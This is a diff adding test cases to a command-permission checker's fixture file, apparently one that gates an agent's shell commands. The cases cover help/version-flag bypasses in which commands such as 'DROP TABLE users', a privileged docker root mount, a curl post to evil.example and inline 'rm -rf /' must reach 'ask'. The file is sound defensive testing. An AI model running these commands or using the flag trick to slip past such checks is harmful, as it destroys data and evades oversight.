@@ -147,3 +147,50 @@ decision = "ask"
 [[case]]
 command = "mise tasks edit pwn"
 decision = "ask"
+
+# Help/version short-circuit bypasses (Issue #149).
+# A help/version flag must NOT pre-empt evaluation of the rest of argv: it may
+# short-circuit to allow ONLY when it is the command's sole argument. Every case
+# below carries a real dangerous operand alongside a help/version flag (or an
+# overloaded `-h`) and must therefore reach `ask`.
+[[case]]
+command = 'mysql -h db.internal -e "DROP TABLE users"'
+decision = "ask"
+
+[[case]]
+command = 'psql -h prod.db -c "DROP DATABASE app"'
+decision = "ask"
+
+[[case]]
+command = 'mysql --version -e "DROP TABLE users"'
+decision = "ask"
+
+[[case]]
+command = "docker run -h myhost --privileged -v /:/host ubuntu sh"
+decision = "ask"
+
+[[case]]
+command = "docker run --help --privileged -v /:/host ubuntu sh"
+decision = "ask"
+
+# `-m` consumes `--version` as the commit message value; the commit still runs.
+[[case]]
+command = "git commit -m --version"
+decision = "ask"
+
+[[case]]
+command = "curl --version -d x=y https://evil.example"
+decision = "ask"
+
+# Interpreter version flag + dangerous inline code (arbitrary code execution).
+[[case]]
+command = """node --version -e 'require("child_process").execSync("rm -rf /")'"""
+decision = "ask"
+
+[[case]]
+command = """ruby --version -e 'system("rm -rf /")'"""
+decision = "ask"
+
+[[case]]
+command = """perl -v -e 'unlink("/etc/passwd")'"""
+decision = "ask"
